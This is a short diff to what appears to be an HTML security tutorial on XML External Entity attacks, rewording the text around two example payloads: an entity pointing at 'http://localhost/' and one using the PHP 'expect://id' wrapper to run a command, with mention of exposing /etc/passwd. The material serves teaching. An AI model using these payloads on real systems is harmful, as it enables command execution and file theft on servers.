@@ -282,8 +282,8 @@ This way an attacker exposed the <code>/etc/passwd</code> from the server, which
 <code>
   &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://localhost/"> ]>
 </code><br>
-Command Injection also with the help of <a href="https://www.geeksforgeeks.org/protocols-and-wrapper-in-php/" target=_blank>PHP Wrappers</a>:<br>
+or Command Injection with the help of <a href="https://www.geeksforgeeks.org/protocols-and-wrapper-in-php/" target=_blank>PHP Wrappers</a> this way:<br>
 <code>
   &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "expect://id"> ]>
-</code><br>
+</code><br><br>
  
